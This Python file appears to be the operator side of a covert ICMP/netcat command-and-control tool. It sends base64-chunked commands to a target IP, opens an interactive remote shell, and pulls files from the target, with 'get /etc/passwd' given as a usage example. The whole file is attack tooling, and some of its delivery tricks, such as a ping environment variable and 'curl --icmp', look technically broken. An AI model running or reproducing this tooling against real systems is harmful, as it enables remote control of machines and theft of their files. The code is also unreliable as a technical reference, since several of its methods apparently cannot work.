#!/usr/bin/env python3
"""
Low-Privilege ICMP Controller
Uses standard system tools instead of raw sockets
No root privileges required, but with limited functionality
"""

import os
import sys
import time
import subprocess
import base64
import json
import threading
from typing import Optional, List

# Import utility functions
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.utils import (
    validate_ip, create_directories, safe_file_write, 
    create_low_privilege_mode, send_icmp_low_privilege
)

# Configuration
OUTPUT_DIR = "../data/outputs"
create_directories(OUTPUT_DIR)

# Low privilege mode configuration
LOW_PRIV_CONFIG = create_low_privilege_mode()

class LowPrivilegeController:
    """
    ICMP Controller that works without root privileges
    Uses standard ping and system tools
    """
    
    def __init__(self, target_ip: str):
        self.target_ip = target_ip
        self.session_id = f"sess_{int(time.time())}"
        
    def send_command(self, command: str) -> bool:
        """
        Send command using low-privilege methods
        """
        try:
            # Encode command
            encoded_command = base64.b64encode(command.encode()).decode()
            
            # Split into chunks if too large
            max_size = LOW_PRIV_CONFIG['max_payload_size']
            chunks = [encoded_command[i:i+max_size] for i in range(0, len(encoded_command), max_size)]
            
            for i, chunk in enumerate(chunks):
                payload = f"CMD:{self.session_id}:{i+1}/{len(chunks)}:{chunk}"
                
                # Try different methods to send
                success = False
                
                # Method 1: Environment variable with ping
                env = os.environ.copy()
                env['ICMP_COMMAND'] = payload
                try:
                    result = subprocess.run([
                        'ping', '-c', '1', self.target_ip
                    ], capture_output=True, text=True, timeout=10, env=env)
                    if result.returncode == 0:
                        success = True
                except Exception:
                    pass
                
                # Method 2: Use curl with ICMP (if available)
                if not success:
                    try:
                        result = subprocess.run([
                            'curl', '--icmp', '-d', payload, f'icmp://{self.target_ip}'
                        ], capture_output=True, text=True, timeout=10)
                        if result.returncode == 0:
                            success = True
                    except Exception:
                        pass
                
                # Method 3: Use netcat with UDP (fallback)
                if not success:
                    try:
                        result = subprocess.run([
                            'nc', '-u', self.target_ip, '53'
                        ], input=payload, capture_output=True, text=True, timeout=10)
                        if result.returncode == 0:
                            success = True
                    except Exception:
                        pass
                
                # Method 4: Write to temporary file (for local testing)
                if not success:
                    try:
                        command_file = f"/tmp/icmp_command_{self.session_id}"
                        with open(command_file, 'w') as f:
                            f.write(payload)
                        success = True
                    except Exception:
                        pass
                
                if success:
                    print(f"Sent command chunk {i+1}/{len(chunks)}")
                    time.sleep(1)  # Rate limiting
                else:
                    print(f"Failed to send command chunk {i+1}")
                    
            return True
            
        except Exception as e:
            print(f"Error sending command: {e}")
            return False
    
    def receive_response(self, timeout: int = 30) -> Optional[str]:
        """
        Receive response using low-privilege methods
        """
        try:
            start_time = time.time()
            response_chunks = {}
            expected_chunks = 0
            
            while time.time() - start_time < timeout:
                # Method 1: Check environment variables
                icmp_data = os.environ.get('ICMP_RESPONSE')
                if icmp_data:
                    response = self.parse_response(icmp_data)
                    if response:
                        return response
                
                # Method 2: Check response files
                response_file = f"/tmp/icmp_response_{self.session_id}"
                if os.path.exists(response_file):
                    try:
                        with open(response_file, 'r') as f:
                            response_data = f.read().strip()
                        response = self.parse_response(response_data)
                        if response:
                            os.remove(response_file)
                            return response
                    except Exception as e:
                        print(f"Error reading response file: {e}")
                
                # Method 3: Use netstat to monitor network activity
                # This is very limited but doesn't require privileges
                
                time.sleep(2)  # Check every 2 seconds
            
            print("Timeout waiting for response")
            return None
            
        except Exception as e:
            print(f"Error receiving response: {e}")
            return None
    
    def parse_response(self, response_data: str) -> Optional[str]:
        """
        Parse response data
        """
        try:
            if response_data.startswith("RESP:"):
                # Parse response format: RESP:session:chunk_num/total:data
                parts = response_data.split(":", 3)
                if len(parts) == 4:
                    session, chunk_info, data = parts[1], parts[2], parts[3]
                    
                    if session == self.session_id:
                        chunk_num, total_chunks = map(int, chunk_info.split("/"))
                        
                        # Decode the data
                        try:
                            decoded_data = base64.b64decode(data).decode()
                            return decoded_data
                        except Exception:
                            return data
            
            return response_data
            
        except Exception as e:
            print(f"Error parsing response: {e}")
            return None
    
    def execute_command(self, command: str) -> Optional[str]:
        """
        Execute command on target and get response
        """
        print(f"Sending command: {command}")
        
        # Send command
        if not self.send_command(f"CMD:TASK:{command}"):
            print("Failed to send command")
            return None
        
        # Wait for response
        print("Waiting for response...")
        response = self.receive_response()
        
        if response:
            print("Response received:")
            print(response)
            return response
        else:
            print("No response received")
            return None
    
    def get_file(self, filepath: str) -> Optional[str]:
        """
        Get file from target
        """
        print(f"Requesting file: {filepath}")
        
        # Send file request
        if not self.send_command(f"CMD:GET:{filepath}"):
            print("Failed to send file request")
            return None
        
        # Wait for response
        print("Waiting for file...")
        response = self.receive_response()
        
        if response:
            if response.startswith("FILE:"):
                # Parse file response
                try:
                    header, encoded_data = response.split("\n", 1)
                    file_path = header[5:].strip()
                    file_data = base64.b64decode(encoded_data)
                    
                    # Save file
                    output_path = os.path.join(OUTPUT_DIR, os.path.basename(file_path))
                    with open(output_path, 'wb') as f:
                        f.write(file_data)
                    
                    print(f"File saved to: {output_path}")
                    return f"File saved to: {output_path}"
                except Exception as e:
                    print(f"Error processing file response: {e}")
                    return None
            else:
                print("Response received:")
                print(response)
                return response
        else:
            print("No response received")
            return None

def interactive_shell(target_ip: str):
    """
    Interactive shell for low-privilege controller
    """
    controller = LowPrivilegeController(target_ip)
    
    print("Low-Privilege ICMP Controller")
    print("Type 'exit' or 'quit' to leave.")
    print("Type 'help' for available commands.")
    print("-" * 50)
    
    while True:
        try:
            command = input("$ ").strip()
            
            if command.lower() in ["exit", "quit"]:
                break
            elif command.lower() == "help":
                print("\nAvailable Commands:")
                print("  help                    - Show this help")
                print("  get <filepath>          - Get file from target")
                print("  <any command>           - Execute command on target")
                print("  exit/quit               - Exit shell")
                print()
                continue
            elif command.lower().startswith("get "):
                filepath = command[4:].strip()
                controller.get_file(filepath)
            elif command:
                controller.execute_command(command)
            else:
                continue
                
        except KeyboardInterrupt:
            print("\nExiting...")
            break
        except EOFError:
            print("\nExiting...")
            break

def main():
    """
    Main function for low-privilege controller
    """
    if len(sys.argv) < 2:
        print("Low-Privilege ICMP Controller")
        print("Usage: python3 low_privilege_controller.py <TARGET_IP> [COMMAND]")
        print("Examples:")
        print("  python3 low_privilege_controller.py 192.168.1.100")
        print("  python3 low_privilege_controller.py 192.168.1.100 'whoami'")
        print("  python3 low_privilege_controller.py 192.168.1.100 'get /etc/passwd'")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    
    if not validate_ip(target_ip):
        print(f"Error: Invalid IP address: {target_ip}")
        sys.exit(1)
    
    controller = LowPrivilegeController(target_ip)
    
    if len(sys.argv) > 2:
        # Single command mode
        command = " ".join(sys.argv[2:])
        if command.lower().startswith("get "):
            filepath = command[4:].strip()
            controller.get_file(filepath)
        else:
            controller.execute_command(command)
    else:
        # Interactive mode
        interactive_shell(target_ip)

if __name__ == "__main__":
    main() 